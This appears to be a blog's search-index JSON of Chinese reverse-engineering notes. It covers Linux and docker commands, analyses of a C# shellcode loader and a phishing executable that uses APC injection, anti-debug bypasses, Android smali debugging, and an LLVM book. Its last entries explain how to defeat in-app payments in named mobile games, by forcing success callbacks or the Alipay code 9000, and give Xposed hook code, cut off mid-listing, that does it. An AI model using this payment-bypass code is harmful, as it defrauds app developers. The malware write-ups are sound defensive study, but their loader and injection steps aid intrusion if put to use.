d7f047fd99898733feda38e9abde7d1d65cef7bbbc04f75cf78d972d62c4a79837bd94ba5a77d91fe0339e438b95402d7225220b05f0649d741a5b68483370f0f783f6f8ab6dfb464fea8f3b3ed38cc06d5640395d9e4b5176f0164d4d1e2cdd49177f4f19fb046ee3345b197b0fc48b1f04094f62a2c3e41523b3b46f79d5ae6900b70b72f8be9fcbd844ffd2f2a408f71ab76defd06596bd6336e4f3e8510a7e687584e755e6ba261a4a42dcbe85171dafa5923f9ff49f268851f4c8a9d558f52d635b9c2437bedc27966c1fe694cec2a14448a746a24f330f60df2c1c380e9cd154ddbc50fb1828c30","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-6(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84)/"},{"title":"x64（学习笔记） - 7（x64 - 漏洞隐藏注入）","text":"嗨，请准确无误地输入密码查看哟！ a015281182418cda67d19eecbbb4c0a5","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7(x64-%E6%BC%8F%E6%B4%9E%E9%9A%90%E8%97%8F%E6%B3%A8%E5%85%A5)/"},{"title":"x64（学习笔记） - 9（x64 - r3进入r0）","text":"嗨，请准确无误地输入密码查看哟！ fa5d0ff48b3407361d3fdf2093e2198fef225b815d7266bb1882050a9f7fbd0354d333082715d0e31db571277e57326da5502234bc7d34336fce3f684830ea9fe12d1dd05bc741295c54407eeb8daec1f8f65380df2fc22cfd26c6bff83973160ef69902ccc3201afacd5f1e6a8199f682afa2a19e4da7748d5e965607ec963b26ec36dd58d7f974bf02c06be29dbeeaf8268a8e252772c5202ba34de6b45c73984d6149ff70d4fe23fb26fd399a7989fa3a2b49904c9780c1562cd2dc685ca068e10b370b68589c1a4e9b101b01b6dcf54d33e4cc32d98782305c0d6ee753040df75de4088756e8e84b1df553f7ee3e9d272b19741d3893a80f3bbdaa2393b532b7b793921e45cb0a86fa48811f63e836149a7e3c34586f6c0a25cb489f9990c1ca18433e2983f995e96c50fc7a843666cba75ed0f4e0434bd5916c1f579e7c3db053ae3859ee9e42b7632f6ead5233608f646f76374cf892fe0387023b549df98f6d12fd4d8ede505840bede0ddc96c05294f629d8344d67f59539e89617dc7727343d251b36f273f3ac71d00008c1ca011b7b51179a543de52155d2eb3bd8e96f8a82614b120db2c9aaf81ed4b44eeebfb684ba2b8ada52eaa45301168385918fcf2bb39a6cee5ae70d7e1287e5e09a7a8b80113443bebbe4d718362c1930abec9c6bf354a1d24dad022b268395ce6d05a9adbfd554e005c7ce1d39709fc4057fbdf211cbdb8a29fdaa3232099f3b2bc38cdacbab172be0f771b177c923d67b1c56a9a5af8f8b86b6a844e43368829e095cec830fe297589255f8655639b91da57c16ae8ee918ef4ab3520ae4bdedf202d707607fd6f4adfa4c9846042ebc33ae87feafb1f99ba897b8eff64ec609ff1543e853c5c8af2bc3a1ead64086b6febc4592fe6bab3706193e1d8ca998f3d16746de744312f30da6fb5e324ebec431048472d4081ae4aab4f7a41b981d8226102a099cbf16433cb3c48a4e8793ce95faad1f328b224700a651f352f5f041fc4e6b9fe52e7b97c63d621acd948d3824716116bfcec35bb89b295bf9d6b5b102c97c51cb945db63e8fd6c3fe5ddf455fbe648be5c8085526a5b444294a5c3a2c974df9f0912556565b6a0a6788e36ba44162c8781c2d125f6ee3ec1ecf860683db323ba2c0e8d857ad45faf0a5a2cd6516a89b7ef1176e7bb92d65022c19b0d2e82da8c8aab9c2acf489421229009d62fd5c38b20f3626ed73390aef8bddec49df02a61d952ce7cb21bd95a3881bc3752cc5cfa52ada893f35e4518998ebdd524f4dba19dc7c452b74c28c87711708755d6e500c6363b2c0145705260d1adf27ce2a25446d6fbe450e4fc9db0f89e0a2806d85767b92097b1d915e19f10dea4d2a9305302aeb676d245451f7382e9779b43a05210be30a9b7e2562e1543b207d261d969dc969b0d3fb78c670a6ac448d7619dea94fabc7344e1875e4e9db1093df805a36030d38d46432dd00e693e4bc546c94df034c4623e88239052de99f388ae1a5fdea3d45dbac3b5a64a663e22c089d6df9a4382958726f91499091ff6a4dbe92d1d4a89fb30963705f999bcdbb1d3a41cb3d847a3d0d964d42e11118793e440f210affc9f2f44b9697041a21a48f51f7d04d07a7d35aee6d943a5a8e0d00c9298a8935cc668cd4742589c2133b0228bd4ea39809ec9fc7f52b8179075d75b190d53583ada72c49e0040b770bfe40527586de19ce5f5bd62092910d40f4c3819a0c56d795237bd01f3522e7d766728f46f2315276fd8f3d6eabd44840cc8a5170088f9c1eb32c77683c161616da014b778aada0ed47e71fa5cd4b6170d3d0c7fcdd3351a43956c4d1f793317b06b80b9474b1412226a4a8dac6296c86b543512499864534612df26c13b1ad14a71fdbe9e7fd2395e785f8133d5aa2d879d3d7832ac34b7d930283479e2a26905b4c3ec0de7b3c77cf7eff2a2981272d6505ea9f638edf33a7e97e5174c418aa99e8427932521be4c8ec726b6fb5d064a2807d4ad679b73ced1b55fba35f4d82abaac63820b1ca21d9370741b25f6e61c7613f2b5d52345f7551f61f99445bc84a1df0480975d655eb8056ac579ce9aacee998be85bc591d0a11b2a2b0db0c82017c7ea49f01eeea40cf6a69a89a2d88adbd64b4684ccec2db7b6ee52c307b7af097b4890cef69f50990142367ff87c162d6beb81c099f8e8c3c878a4221ef70","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-9(x64-r3%E8%BF%9B%E5%85%A5r0)/"},{"title":"x64（学习笔记） - 8（x64 - r3进入r0）","text":"嗨，请准确无误地输入密码查看哟！ c437ed21faa00697120ece7df058da38070955587d20dd53384958e7cd93b7e718cd3e008fcea7da8c6a8b8d55c41c820a49da92c12da0169c32d43e674b6e0f7975e05d5c1c28c9133aabb4dbf9903043385a807fd7639b158a2df7003d3c208988abb7e3693599ec46669f37d61309ccfc832a0d399ffd59712ce0e3ad51fce329ea8424bf404cc5a61273ca5348c6d434b33e6f21e501e2c80c63a06c7cf15d8144861276513ed08f2810db830ceced86c73cb3907c776b45c119d877ffa28d6a2957efca12c86e09be317b1de366bde8ffabb4a18ddf1c0d09e54a3380c64ba60b12a8788e8dcbc305801098cf6b45c990512746bd9da979716c309d97223a03b7f605bd8688253ca8f80351d5770d7dc9dda52328f1941fe145f24f167a1c3108bd43af92858a9728351bd9c2efe9a487ff7831f83a23d7642447c6dc0618806c133dbaa697b923ca8c8a632efea5e36bb6f5c47b6b9e6cf0e24e4f3ceabc4bb0c60b8bd1b9a4760454b456f5c1987de475cc4db015d73097093cbdf5d57f1dbef383308af15af5750711a4818e3beec5ca384a1feb22705abd3b198ad721749ead42094ebf776ab8f6bfb0803974e1cf2116bd83ba2a1503fc0242245525e97c83355898a1dfbfc81709615ddecb560961ea361a925b62cadf6e4c9d7295ecb891237cd589ff9f83dce56b41a05d0bb006b73f09e1150078464083fe309cc51f2f8f2d730a59411f7ad05bb794638e09826d47a8774fafe2c70665dbb94c780e5d60b6f7440b66aa570b8934621f8c34f56985dd9622451087cd2238a374bf478085f8e93310f5ac87cbdfadbac311a34b704624a08234844af23262c88cb5a7ab4aaf30d4b0be2971279c8d7d7b74db61a07c34663d6d2bcff8c5f44efb204efabca19fb1da0966017ebebfb29d0fc7a46a97f3895a33dcf9450cd725b08b033d137a190ae1ba50369821ae3c1eac3406e0f0066dfd028d433fe441ecb188c06408a4846fb258575d629e05cd5df389d554b0966fdadbcefd458c4cfd11ada0867f17320e1a4b773f9a46dc67e06142c1586bda7edc33ae33991a81e25d1086ba6d33d9606cd6ca2420fc1dc80d3d683e60844eb632624e5481a5cd361d1d20c9c7ae8571d4d70d0098768ac1fbf40623ab300e972ba2b8c9f05f0eba7daf32b60da748cc79a83127644f41d19db0fd997d128baf65979b161725757480c2a3d1c0e0429cc9e38a646989966c5f270a817f7befe811b23a8ed25a95b25233ebb79e4e7a93d7fdee4bfb5e3d1ad268e1b3f0101400115a4aa825ce9353d008e909b237095b9e23ddc770e881386c549231d6749b7c79397771794b5bdf","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-8(x64-r3%E8%BF%9B%E5%85%A5r0)/"},{"title":"","text":"#!/bin/sh./bootstrap.sh./configure –enable-debug –disable-shared –enable-staticmake","link":"/2021/04/18/linux/linux%20configure%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/"},{"title":"linux-docker","text":"docker常用命令 docker run 删除docker容器1. ```docker rm $(docker ps -a -q)```一次删除所有停止的容器 2. ```docker rm &lt;CONTAINER ID|NAME&gt; &lt;CONTAINER ID|NAME&gt;``` 删除单个或多个容器。 启动/停止/连接容器1. ```docker start &lt;CONTAINER ID|NAME&gt;``` 启动容器 2. ```docker stop &lt;CONTAINER ID|NAME&gt;``` 停止容器 3. ```docker attach &lt;CONTAINER ID|NAME&gt;``` 附加到当前正在运行的容器 docker .net core生成影像 docker build -t radarserver . 生成影像 docker run -itd -p 5000:5000 imageid arg 生成容器 docker commit -m=&quot;has update&quot; -a=&quot;zpt&quot; 5a76c9bb0d02 zpt/ubuntu:v2 容器更新镜像 -m:提交的描述信息 -a:指定镜像作者 5a76c9bb0d02：容器ID runoob/ubuntu:v2:指定要创建的目标镜像名 通过dockerfile创建影像 1. 构建dockerfile文件 启动并进入容器内部 映射当前文件夹到容器的projcet 中 1docker run -it -v$(pwd):/project amd64/centos:7 /bin/bash 启动并进入容器内部 映射当前文件夹到容器的projcet 中,并执行 shell 1docker run -it -v$(pwd):/project --rm amd64_rtshell_make /bin/bash -c &quot;cd /project; make all;&quot; docker 镜像导出和导入导出1docker save ImageName &gt; fileName.tar 导入1docker load &lt; fileName.tar 参考文章:Dockerfile文件详解","link":"/2020/11/23/linux/linux-docker/"},{"title":"linux_mysql","text":"创建用户CREATE USER ‘username’@’host’ IDENTIFIED BY ‘password’; 创建数据库CREATE DATABASE databasename; 授权GRANT all privileges ON databasename.tablename TO ‘username’@’host’; 信息同步到内存flush privileges; 参考文章:参考链接","link":"/2020/11/13/linux/linux-mysql/"},{"title":"linux-nginx","text":"centos8 nginx安装 下载nginx 官网：http://nginx.org/ 创建文件夹 mkdir nginx 复制压缩包地址 wget http://nginx.org/download/nginx-1.17.6.tar.gz下载文件 wget不存在 yum安装wget yum -y install wget 安装必要插件 yum -y install automake autoconf libtool make yum -y install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel 压缩下载好的文件 tar -zxvf nginx-1.17.6.tar.gz cd nginx-1.17.6 指定安装路径 ./configure --prefix=/software/nginx --with-http_stub_status_module --with-http_ssl_module make编译 make install安装 进入到安装nginx目录下面的sbin cd /software/nginx/sbin 启动命令 ./nginx 常用命令 从容停止服务器 nginx -s quit 立即停止服务器 nginx -s stop 查询nginx主进程号 ps -ef | grep nginx 从容停止 kill -QUIT 主进程号 快速停止 kill -TERM 主进程号 强制停止 kill -9 nginx 启动 ./nginx 重启 ./nginx -s reload 参考文章:Nginx | CentOS 8 安装Nginx详细教程","link":"/2020/11/23/linux/linux-nginx/"},{"title":"linux-命令","text":"查看端口占用1netstat -nap|grep 8000 终止进程1kill -9 pid 后台运行1nohup ./linux &gt; myout.file 2&gt;&amp;1 &amp;","link":"/2021/04/07/linux/linux-%E5%91%BD%E4%BB%A4/"},{"title":"","text":"1234567#!/bin/bashinstallation_dir=&quot;$( cd &quot;$( dirname &quot;${BASH_SOURCE[0]}&quot; )&quot; &gt;/dev/null &amp;&amp; pwd )&quot;export LD_LIBRARY_PATH=${installation_dir}:${LD_LIBRARY_PATH}${installation_dir}/yara ${1+&quot;$@&quot;}","link":"/2021/04/18/linux/linux%E4%B8%8B%E7%BC%96%E8%AF%91yara%E6%89%A7%E8%A1%8Csh%E6%96%87%E4%BB%B6/"},{"title":"","text":"bash: ./build.sh: /bin/sh^M: bad interpreter: No such file or directory q:执行.sh脚本时，报错 “start.sh /bin/bash^M: 坏的解释器：没有那个文件或目录”,因为 .sh文件是从windows拷贝过来的，所以多了\\r，执行命令，把文件中的\\r 替换成空白 sed -i 's/\\r$//' build.sh 参考链接 error: AC_CONFIG_MACRO_DIRS([m4]) conflicts with ACLOCAL_AMFLAGS=-. m4 1234apt-get install dos2unix dos2unix *.shdos2unix *.am 冲突原因，在windows下载，在linux上使用，行结尾标志不一样，需要使用dos2unix转换一下即可","link":"/2021/04/18/linux/linux%E4%B8%8B%E7%BC%96%E8%AF%91yara/"},{"title":"C内存加载C# 木马分析","text":"木马分析1.拖到查壳中 没有分析出来 2.直接用火绒剑看一下调用 C# 的系统dll 运行的时候 并没有发现有什么网络请求 3.直接拖IDA 发现IDA识别出来很多函数 看了一下字符串也没看到啥有用的 主函数一堆乱七八糟的 仔细看主函数 一堆乱七八杂的判断和 if，但是 在这里面 它肯定要调用函数，我只发现了一个调用点 进去分析发现了类似的代码结构（有点像llvm过的代码），它调用了InternetOpenA（导入表中有一些 winiNet http请求的函数）然后又jmp走了 winiNetHttp请求参考网址：https://my.oschina.net/allenwen/blog/685573 4.x32dbg动态调试 直接下断 InternetConnectA,HttpOpenRequestA 看一下它的请求 url: pastebin.com:443(0x1BB)/raw/nrSZnmgc Get Https(443) 返回值很像base64 base64解密之后 发现 开头就是 e9 0a 05 00 00 很像jmp (怀疑是shellcode) 动态调试下断点：InternetReadFile 函数返回结束的地方 因为返回值是base64加密，而且是shellcode，所以怀疑出去之后解密数据,解密完之后把shellcode贴到内存中 直接下memcpy，发现程序都运行起来了 它都没有copy… 所以只能慢慢跟 找到它贴shellcode的地方，然后下断点,动态跟踪 动态调试shellcode的时候发现了C加载C#的函数C内存运行C#dll-参考地址：www.cnblogs.com/flyDream12315/p/6062920.html LoadLibrary(“mscoree.dll”); LoadLibrary(“wininet.dll”); LoadLibrary(“oleaut32.dll”); 网络拉取shellcode base64解密 是个PE文件 esp+104 = PeDll CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&amp;pMetaHost); ICLRMetaHost: IUnknown： (pMetaHost)+0xC的位置 pMetaHost-&gt;GetRuntime(runtimeVersion, IID_ICLRRuntimeInfo, (VOID)&amp;pRuntimeInfo); ICLRRuntimeInfo: *(*pRuntimeInfo)+0x28的位置 pRuntimeInfo-&gt;IsLoadable(&amp;load); (pRuntimeInfo)+0x24的位置 pRuntimeInfo-&gt;GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (VOID)&amp;pRuntimeHost); ICorRuntimeHost: *(*pRuntimeHost)+0x28的位置 pRuntimeHost-&gt;Start() *(*pRuntimeHost)+0x34的位置 pRuntimeHost-&gt;GetDefaultDomain(&amp;pAppDomain) (pAppDomain) 第一个函数 pAppDomain-&gt;QueryInterface(IID__AppDomain, (VOID)&amp;pDefaultAppDomain); SAFEARRAY* pSafeArray = SafeArrayCreate(0x11,1,pData) SafeArrayCreate函数相关参考地址：https://blog.csdn.net/jisuanjixu/article/details/5959186 esp+0x110 单步进去发现是 SafeArrayAccessData(pSafeArray,&amp;pvData) 有一块循环赋值的地方，把PEdll的数据复制到了pvData中 又是一个call，单步直接进去是 SafeArrayUnaccessData(pSafeArray) esp+0x14 = pDefaultAppDomain,*(*pDefaultAppDomain)+0xB4 pDefaultAppDomain-&gt;Load_3(pSafeArray, &amp;pAssembly); 加载C#dll pAssembly(_Assembly) *(*pAssembly)+0x40 pAssembly-&gt;get_EntryPoint(&amp;pMethodInfo) 获取入口函数 [esp+12C] (verctorArg) = SafeArrayCreateVector(8,0,1) esi(verctor2) = SafeArrayCreateVector(0xC,0,1) 这个shellcode进来的时候有个参数，eax = SysAllocString(arg) SafeArrayPutElement(verctorArg,&amp;int(0),eax) SafeArrayPutElement(verctor2,&amp;int(0),一个变量) esp+C = pMethodInfo pMethodInfo-&gt;Invoke_3(obg,verctor2,&amp;retVal) 执行程序入口函数 mian 总结：全流程就是exe运行了一个shellcode shellcode中执行了C#的dll，所以主程序只是一个加载器而已，当获取到C# pedll的时候，其实就可以直接拉dnspy里面查看","link":"/2020/08/26/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/CSharp%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},{"title":"E盾反调试分析","text":"GetStartupInfo 在程序启动后，会有一个StartupInfo的结构体变量，来保存程序启动的信息，我们通过其中参数的改变来检测程序是正常运行还是在调试器中运行的 参考地址：https://www.cnblogs.com/ziolo/p/3434815.html 参考地址：https://blog.csdn.net/tk86935367/article/details/8174368 E盾V51代码： 123456789101112BOOL UseGetStartupInfoCheckDebug(){ STARTUPINFO startUpInfo; startUpInfo.cb = sizeof(startUpInfo); GetStartupInfo(&amp;startUpInfo); if (startUpInfo.dwX != 0 || startUpInfo.dwY != 0 || startUpInfo.dwXCountChars != 0 || startUpInfo.dwYCountChars != 0 || startUpInfo.dwFillAttribute != 0 || startUpInfo.dwXSize != 0 || startUpInfo.dwYSize != 0 || (startUpInfo.dwFlags &amp; STARTF_FORCEOFFFEEDBACK)) { std::cout &lt;&lt; &quot;! GetStartupInfo debugger&quot; &lt;&lt; std::endl; return true; } return false;} 反反调试方案： Hook GetStartupInfo 返回一个 非0值 就好了 Hook GetStartupInfo 返回一个 非0值 就好了 IsDebuggerPresent 这个函数可以用在程序中，检测当前程序是否正在被调试，从而执行退出等行为，达到反调试的作用。 该函数通过 fs:[0x18] 获取 TEB -&gt; TEB:[0x30] 获取 PEB -&gt; PEB:[0x2] BeingDebugged:UChar 调试标志， 通过调试标志 来判断是否调试 参考资料：https://blog.csdn.net/chriz_w/article/details/52096552 参考资料：https://blog.csdn.net/ls1160/article/details/38105873 E盾V51代码： 123456789BOOL UseIsDebuggerPresentCheckDebug(){ if (IsDebuggerPresent()) { std::cout &lt;&lt; &quot;! IsDebuggerPresent debugger&quot; &lt;&lt; std::endl; return true; } return false;} 反反调试方案：hook函数直接返回false 心得 部分根据标志来判断反调试的，可以通过 直接使用汇编来写反调试 比如：IsDebuggerPresent","link":"/2021/07/10/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/E%E7%9B%BE%E5%8F%8D%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"title":"post","text":"5.71 加密狗版","link":"/2020/10/18/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/E%E8%AF%AD%E8%A8%80%E7%B3%BB%E7%BB%9F%E6%A0%B8%E5%BF%83%E6%94%AF%E6%8C%81%E5%BA%93%E7%89%88%E6%9C%AC%E5%88%86%E6%9E%90/"},{"title":"pdf钓鱼样本分析","text":"观察样本 一个名为排班表的pdf图标的exe程序，很明显一个钓鱼程序 查壳 x64的 无壳 ida静态分析 第一块是一个清除ntdll上的hook的函数（这是我分析过重新命名的 映射ntdll 然后 覆盖了ntdll的text段，这段应该是他故意写了一个不正规的操作，导致IDA静态分析 分析错了属性 第二块就是一个获取了一些ntdll的函数 第三块是读取了一个资源文件 并且把文件放到了fileData中 第四块简单看了一下，是操作的就是filedata，直接猜测是对文件的解密操作 第五块就是创建了个映射内存 第六块 判断进程是不是system用户 第七快 如果是system用户 就使用svchost.exe来提权启动 如果不是就用explorer.exe来提权 第八块 不是system用户 利用explorer.exe来提权启动 跟第七块的代码是一样的 提权创建的新进程之后用把之前的filedata（shellcode）利用映射贴到启动的新进程中，然后插入APC来启动 第九块从资源文中拿到一个pdf文件 释放到当前目录下 然后打开了该文件","link":"/2020/08/26/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/pdf%E9%92%93%E9%B1%BC%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"},{"title":"","text":"使用C++学习LLVM编译器和核心库的初学者教程：https://github.com/send010/Learn-LLVM-12","link":"/2021/11/05/%E8%B5%84%E6%96%99/%E8%B5%84%E6%96%99/"},{"title":"一个藏在正常程序下的C#木马样本分析","text":"前言本文章只分析了木马加载的过程，不分析木马功能 背景护网期间一个朋友发给我的样本让我帮忙分析一下 分析过程 ExeinfoPe查了一下是一个C#的程序，然后加了个混淆直接de4dot处理一下拉入dnspy 反编译之后看没发现什么http请求，启动函数运行了一个frmMain窗体，看了看代码什么的发现是一个正常的窗体程序，什么也没发现 动态调试 程序肯定是有问题的，于是就动态调试发现，这个程序是一个加载程序，他找了一套正常程序的源码重写了一个属性的set函数 在set函数中，从资源文件拿到dll然后加载dll 利用反射加载dll之后 反射调用函数 Type type = assembly.GetTypes()[0]; MethodInfo method = type.GetMethod(“Click”); method.Invoke(0, parameters); 反射获取到第一个类，然后获取该类的Client函数，参数分别是 “OVAGp”,”bAJs”,”Finast” 直接dnspy动态调试 dump出来dll文件 dll也是C#的 然后加了混淆直接de4dot处理 然后拖入dnspy dnspy dll反编译 看着这样一个正常的程序，我们直接找一个Client的函数 一眼就是反射调用，不过他是通过vb.net的 dll是保存在资源图片中的 这个不用关注 我们直接把处理之后的的rawAssembly 给dump出来就好了 dump出来的dll还是一个C#的 是有复杂的混淆的 de4dot处理不了，我直接找画眉师傅给处理了一下然后拉到dnspy里面看了看 就是真实的木马样本。 总结此样本是一个加载器 首先从资源文件中拿到dll通过C#的反射加载起来，然后该dll再次从资源文件中拿到一个图片，从图片中提取出来功能dll，通过Microsoft.VisualBasic库的反射加载起来功能dll， 加载器和dll都是伪装成了正常的程序，如果不仔细看的时候 就可能以为是一个正常程序放过去了","link":"/2021/04/15/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E4%B8%80%E4%B8%AA%E8%97%8F%E5%9C%A8%E6%AD%A3%E5%B8%B8%E7%A8%8B%E5%BA%8F%E4%B8%8B%E7%9A%84CSharp%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"},{"title":"","text":"所需插件Android Studio 4.0及以上需要smalidea-0.06插件Android Studio 4.0以下需要smalidea-0.05插件安装插件流程 获取到对应的smalidea插件包 (https://bitbucket.org/JesusFreke/smalidea/downloads/) 选择AndroidStudio左上角File -&gt; Settings -&gt; Plugins -&gt; 齿轮图标 -&gt; Install Plugin from Disk -&gt; 选择插件包（不需要解压） 保存并重启IDEA即可 注意事项smali代码调试不能开启ddms（开启ddms会占用端口）需要开启系统调试开关或者修改配置文件添加android:debuggable=”true” (模拟器默认都是开启系统调试开关的,xposed+bdopenrer插件可以设置系统调试开关)端口占用问题 ，一般都是电脑端某个程序占用了调试端口8700操作流程 获取APK的smali文件 可以使用 androidkiller反编译 AndroidStudio打开已存在工程选择获取到的smali文件夹 设置项目属性：右击项目 -&gt; Mark Directory as -&gt; Sources Root 配置调试属性： -&gt; Run -&gt; Edit Configurations -&gt; add -&gt; remote 命令行启动调试模式 adb shell am start -D -n packagename/.MainActivity 查看进程ID ps |grep packagename 配置端口转发：adb forward tcp:8700 jdwp:pid 名称：PingAn1包名：com.testjava.jack.pingan1入口：com.testjava.jack.pingan1.MainActivity版本信息：Ver：1.0(1) SDK：19 TargetSDK：26 Activity： com.testjava.jack.pingan1.MainActivity Receiver： Service： Permission： https://www.jianshu.com/p/c9a7debfbf91","link":"/2021/11/05/Android/%E8%B0%83%E8%AF%95/AndroidStudio%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"},{"title":"","text":"优点缺点调试大型APP容易崩，出错显示smali代码和apktool反编译后的不一样 流程 把要调试的APP拖入到jeb工具中 调试器APP，先打断点","link":"/2021/11/05/Android/%E8%B0%83%E8%AF%95/jeb%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"},{"title":"","text":"Learn LLVM 12A beginner’s guide to learning LLVM compiler tools and core libraries with C++ (使用C++学习LLVM编译器和核心库的初学者教程) 作者：Kai Nacke 译者：陈晓伟 原文发布时间：2021年5月28日 (来源亚马逊) 翻译是译者用自己的思想，换一种语言，对原作者想法的重新阐释。鉴于我的学识所限，误解和错译在所难免。如果你能买到本书的原版，且有能力阅读英文，请直接去读原文。因为与之相较，我的译文可能根本不值得一读。 — 云风，程序员修炼之道第2版译者 本书概述学习如何构建和使用编译器，包括前端、流水线优化和利用LLVM核心库的强大功能构建新的后端编译器。 LLVM是为了弥合编译器理论和实际开发之间的差异而出现的。它提供了模块化的代码库和先进的工具，帮助开发人员轻松地构建编译器。本书提供了对LLVM的介绍，帮助读者在各种情况下构建和使用编译器。 本书将从配置、构建和安装LLVM库、工具和外部项目开始。接着，向您介绍LLVM的设计，以及在每个编译器阶段(前端、优化器和后端)的实际工作方式。以实际编程语言为例，学习如何使用LLVM开发前端编译器，并生成LLVM IR，将其交给优化流水线，并从中生成机器码。后面的章节将展示如何扩展LLVM，以及LLVM中的指令选择是如何工作的。在了解如何为LLVM开发新的后端编译器之前，将重点讨论即时编译问题和LLVM提供的JIT编译的支持情况。 阅读本书后，您将获得使用LLVM编译器开发框架的实际经验，并得到一些具有帮助性的实际示例和源代码片段。 关键特性 学习如何有效地使用LLVM 理解LLVM编译器的高级设计，并将原则应用到自己的编译器中 使用基于编译器的工具来提高C++项目的代码质量 内容纲要 配置、编译和安装LLVM框架 理解LLVM源码的结构 了解在项目中可以使用LLVM做什么 探索编译器是如何构造的，并实现一个小型编译器 为通用源语言构造生成LLVM IR 建立优化流水线，并根据自己的需要进行调整 使用转换通道和clang工具对LLVM进行扩展 添加新的机器指令和完整的后端编译器 作者简介Kai Nacke是一名专业IT架构师，目前居住在加拿大多伦多。毕业于德国多特蒙德技术大学的计算机科学专业。他关于通用哈希函数的毕业论文，被评为最佳论文。 他在IT行业工作超过20年，在业务和企业应用程序的开发和架构方面有丰富的经验。他在研发一个基于LLVM/Clang的编译器。 几年来，他一直是LDC(基于LLVM的D语言编译器)的维护者。在Packt出版过《D Web Development》一书，他也曾在自由和开源软件开发者欧洲会议(FOSDEM)的LLVM开发者室做过演讲。 审评者介绍Suyog Sarda是一名专业的软件工程师和开源爱好者，专注于编译器开发和编译器工具，是LLVM开源社区的积极贡献者。他毕业于了印度浦那工程学院，具有计算机技术学士学位。Suyog还参与了ARM和X86架构的代码性能改进，一直是Tizen项目编译团队的一员，对编译器开发的兴趣在于代码优化和向量化。之前，他写过一本关于LLVM的书，名为《LLVM Cookbook》，由Packt出版。除了编译器，Suyog还对Linux内核开发感兴趣。他在迪拜Birla Institute of Technology的2012年IEEE Proceedings of the International Conference on Cloud Computing, Technologies, Applications, and Management上发表了一篇题为《VM pin and Page Coloring Secure Co-resident Virtualization in Multicore Systems》的技术论文。 本书相关 github翻译地址：https://github.com/xiaoweiChen/Learn-LLVM-12 本书代码：https://github.com/PacktPublishing/Learn-LLVM-12 译文的LaTeX 环境配置：https://www.cnblogs.com/1625--H/p/11524968.html","link":"/2021/11/05/LLVM/Learn-LLVM-12/README/"},{"title":"","text":"Xposed框架实现Hook的原理介绍 Init -&gt; app_process(xposed会替换这个文件) -&gt;Zygote -&gt; 2.","link":"/2021/11/05/%E6%98%93%E9%94%A6%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E7%B2%BE%E8%8B%B1%E5%9F%B9%E8%AE%AD/Xposed%E6%A1%86%E6%9E%B6%E4%B8%93%E9%A2%98/Xposed%E5%8E%9F%E7%90%86%E5%88%9D%E6%8E%A2/"},{"title":"","text":"经典贪吃蛇大作战关键字符串：支付取消 1234567891011121314151617181920//zombie.class 11,Lcom/qy/zombie/zombie;-&gt;DX_Pay(Ljava/util/HashMap;)V+4h,,public static void DX_Pay(HashMap arg3) { new AlertDialog$Builder(zombie.activity); EgamePay.pay(zombie.activity, ((Map)arg3), new EgamePayListener() { public void payCancel(Map arg4) { Toast.makeText(zombie.activity, &quot;支付取消&quot;, 0).show(); zombie.BuyFailed(); } public void payFailed(Map arg4, int arg5) { Toast.makeText(zombie.activity, &quot;支付失败&quot; + arg5, 0).show(); zombie.BuyFailed(); } public void paySuccess(Map arg4) { Toast.makeText(zombie.activity, &quot;支付成功&quot;, 0).show(); zombie.BuySccess(); } });} 逻辑：payCancel 函数 payFailed 函数 都换成 paySuccess通过androidkiller发现 这几个函数在类：com/qy/zombie/zombie$3 下 单机斗地主支付宝购买关键字： 9000 （0x2328）全局搜索 123456789101112131415161718192021222324252627282930313233343536//com/alipay/sdk/app/j public static j a(int arg1) { j v0; switch(arg1) { case 4001: { v0 = j.e; break; } case 5000: { v0 = j.f; break; } case 6001: { v0 = j.c; break; } case 6002: { v0 = j.d; break; } case 8000: { v0 = j.g; break; } case 9000: { v0 = j.a; break; } default: { v0 = j.b; break; } } return v0; } 修改此函数的参数为9000 街机捕鱼达人 同上 com/alipay/sdk/app/i // 代码： package com.example.xposedplugin; import android.os.Message; import java.util.Map; import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XC_MethodReplacement;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage; public class XposedInit implements IXposedHookLoadPackage { @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable { XposedBridge.log(“当前启动的应用程序是：”+loadPackageParam.packageName); if(loadPackageParam.packageName.equals(&quot;com.yunhaoge.tanchishe.egame&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.qy.zombie.zombie$3&quot;, loadPackageParam.classLoader, &quot;payCancel&quot;, Map.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { 